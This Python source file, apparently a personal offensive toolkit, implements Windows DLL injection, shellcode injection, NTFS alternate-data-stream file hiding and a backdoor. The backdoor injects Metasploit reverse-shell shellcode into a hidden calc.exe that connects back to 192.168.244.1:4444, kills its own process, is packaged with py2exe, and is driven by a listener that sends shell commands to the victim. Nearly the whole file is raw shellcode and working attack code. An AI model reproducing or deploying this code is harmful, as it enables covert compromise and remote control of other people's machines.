'''
@author: beike2020
'''


import sys
from ctypes import *
from distutils.core import setup
import py2exe
import socket


def dllinject_base(pid, dll_path):
    PAGE_READWRITE     = 0x04
    PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
    VIRTUAL_MEM        = ( 0x1000 | 0x2000 )
    kernel32 = windll.kernel32
    dll_len  = len(dll_path)
    
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) ) 
    if not h_process:    
        print "[*] Couldn't acquire a handle to PID: %s" % pid
        sys.exit(0)
      
    # Allocate some space for the DLL path
    arg_address = kernel32.VirtualAllocEx( h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)   
    # Write the DLL path into the allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))   
    # We need to resolve the address for LoadLibraryA
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib  = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")  
    # Now we try to create the remote thread, with the entry point set to LoadLibraryA and a pointer to the DLL path as it's single parameter
    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):    
        print "[*] Failed to inject the DLL. Exiting."
        sys.exit(0) 
    
    print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
    print "[*] VNC Connection now open and ready for action...."


def codeinject_base(pid, pid_to_kill):
    PAGE_EXECUTE_READWRITE = 0x00000040
    PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
    VIRTUAL_MEM        = ( 0x1000 | 0x2000 )
    kernel32      = windll.kernel32
    pid           = int(pid)
    pid_to_kill   = pid_to_kill
    
    if not pid or not pid_to_kill:
        print "Code Injector: ./code_injector.py <PID to inject> <PID to Kill>"
        sys.exit(0)
    
    #/* win32_exec -  EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA Size=159 Encoder=None http://metasploit.com */
    shellcode = \
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \
    "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \
    "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
    "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00"  
    padding       = 4 - (len( pid_to_kill ))
    replace_value = pid_to_kill + ( "\x00" * padding )
    replace_string= "\x41" * 4  
    shellcode     = shellcode.replace( replace_string, replace_value )
    code_size     = len(shellcode)
    
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )    
    if not h_process:    
        print "[*] Couldn't acquire a handle to PID: %s" % pid
        sys.exit(0)
    
    # Allocate some space for the shellcode
    arg_address = kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)    
    # Write out the shellcode
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))
    
    # Now we create the remote thread and point it's entry routine to be head of our shellcode
    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):    
        print "[*] Failed to inject process-killing shellcode. Exiting."
        sys.exit(0)
    
    print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
    print "[*] Process %s should not be running anymore!" % pid_to_kill
    

def filehide_base(hide_file, comm_file):
    # Read in the DLL
    fd = open( sys.argv[1], "rb" )
    dll_contents = fd.read()
    fd.close()
    
    print "[*] Filesize: %d" % len( dll_contents )  
    # Now write it out to the ADS
    fd = open( "%s:%s" % ( comm_file, hide_file ), "wb" )
    fd.write( dll_contents )
    fd.close()


def inject( pid, data, parameter = 0 ):    
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
    if not h_process:
        print "[*] Couldn't acquire a handle to PID: %s" % pid
        sys.exit(0)

    arg_address = kernel32.VirtualAllocEx( h_process, 0, len(data), VIRTUAL_MEM, PAGE_READWRITE)
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, data, len(data), byref(written))
    thread_id = c_ulong(0)
    if not parameter:
        start_address = arg_address         
    else:
        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
        start_address  = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")
        parameter = arg_address

    if not kernel32.CreateRemoteThread(h_process,None,0,start_address,parameter,0,byref(thread_id)):
        print "[*] Failed to inject the DLL. Exiting."
        sys.exit(0)

    return True


def backdoor_base():
    kernel32                = windll.kernel32 
    PAGE_READWRITE          = 0x04
    PROCESS_ALL_ACCESS      = ( 0x000F0000 | 0x00100000 | 0xFFF )
    VIRTUAL_MEM             = ( 0x1000 | 0x2000 )   
    # This is the original executable
    path_to_exe             = "C:\\calc.exe"   
    startupinfo             = STARTUPINFO()
    process_information     = PROCESS_INFORMATION()
    creation_flags          = CREATE_NEW_CONSOLE
    startupinfo.dwFlags     = 0x1
    startupinfo.wShowWindow = 0x0
    startupinfo.cb          = sizeof(startupinfo)
    
    # First things first, fire up that second process and store it's PID so that we can do our injection
    kernel32.CreateProcessA(path_to_exe,
                            None,
                            None,
                            None,
                            None,
                            creation_flags,
                            None,
                            None,
                            byref(startupinfo),
                            byref(process_information))    
    pid = process_information.dwProcessId  
    # Now we have to climb out of the process we are in and code inject our new process to kill ourselves
    #/* win32_reverse -  EXITFUNC=thread LHOST=192.168.244.1 LPORT=4444 Size=287 Encoder=None http://metasploit.com */
    connect_back_shellcode = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45" \
    "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49" \
    "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d" \
    "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66" \
    "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61" \
    "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40" \
    "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" \
    "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6" \
    "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09" \
    "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68" \
    "\xc0\xa8\xf4\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9" \
    "\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68" \
    "\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3" \
    "\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" \
    "\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51" \
    "\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6" \
    "\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6" \
    "\xff\x77\xfc\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0" 
    inject( pid, connect_back_shellcode )
    
    #/* win32_exec -  EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA Size=159 Encoder=None http://metasploit.com */
    our_pid = str( kernel32.GetCurrentProcessId() )  
    process_killer_shellcode = \
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \
    "\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \
    "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
    "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00"   
    padding       = 4 - ( len( our_pid ))
    replace_value = our_pid + ( "\x00" * padding )
    replace_string= "\x41" * 4
    process_killer_shellcode     = process_killer_shellcode.replace( replace_string, replace_value )    
    # Pop the process killing shellcode in
    inject( our_pid, process_killer_shellcode )


# Backdoor builder
def backdoor_builder():
    setup(console=['backdoor.py'], options = {'py2exe':{'bundle_files':1}}, zipfile = None, )    


# Backdoor shell
def backdoor_shell():
    host = "192.168.244.1"
    port = 4444   
    server = socket.socket( socket.AF_INET, socket.SOCK_STREAM )  
    server.bind( ( host, port ) )
    server.listen( 5 )
    
    print "[*] Server bound to %s:%d" % ( host , port )
    connected = False
    while 1:    
        if not connected:
            (client, address) = server.accept()
            connected = True
    
        print "[*] Accepted Shell Connection"
        buffer = ""    
        while 1:
            try:
                recv_buffer = client.recv(4096)    
                print "[*] Received: %s" % recv_buffer
                if not len(recv_buffer):
                    break
                else:
                    buffer += recv_buffer
            except:
                break
    
        # We've received everything, now it's time to send some input
        command = raw_input("Enter Command> ")
        client.sendall( command + "\r\n\r\n" )
        print "[*] Sent => %s" % command


if __name__ == "__main__":
    if not sys.argv[1] or not sys.argv[2]:
        print "DLL Injector: ./my_injector.py <PID to inject> <EXE Path>"
        print "Code Injector: ./my_injector.py <PID to inject> <PID to Kill>"
        print "File Hide: ./my_injector.py <File to load> <File to Hide>"
        sys.exit(0)
    else:
        dllinject_base(sys.argv[1], sys.argv[2])
        codeinject_base(sys.argv[1], sys.argv[2])
        filehide_base(sys.argv[1], sys.argv[2])
    backdoor_base()